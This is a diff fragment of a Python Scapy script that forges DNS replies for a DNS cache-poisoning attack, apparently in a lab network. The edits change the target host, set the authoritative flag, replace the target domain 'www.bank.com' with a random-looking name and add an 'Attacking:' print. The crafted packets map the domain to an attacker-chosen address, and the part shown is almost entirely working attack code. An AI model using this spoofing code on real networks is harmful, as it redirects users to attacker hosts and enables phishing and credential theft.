@@ -7,21 +7,22 @@ import time
 sock = socket(AF_INET, SOCK_DGRAM)
 sock.bind(('0.0.0.0', 1234))
 
-targetaddr="192.168.0.103"
+targetaddr="192.168.0.105"
 
 def request(url, addr):
 	return Ether()/IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url))
 
 def reply(id, url, addr):
 	response = Ether()/IP(dst=targetaddr)/UDP()/DNS(
-		id=id, ancount=1, qr=1, aa=0, ad=0, ra=1, rd=1, cd=1,
+		id=id, ancount=1, qr=1, aa=1, ad=0, ra=1, rd=1, cd=1,
                 qdcount=1,
 		qd=DNSQR(qname=url, qtype='A', qclass='IN'),
 		an=DNSRR(rrname=url, type='A', rdata="192.168.0.104", ttl=1234))
 	return response
 
-targeturl="www.bank.com"
+targeturl="abc23.xyzwtf.dwd"
 
+print("Attacking: " + targeturl)
 print("Prepare Packets")
 
 pkts = []
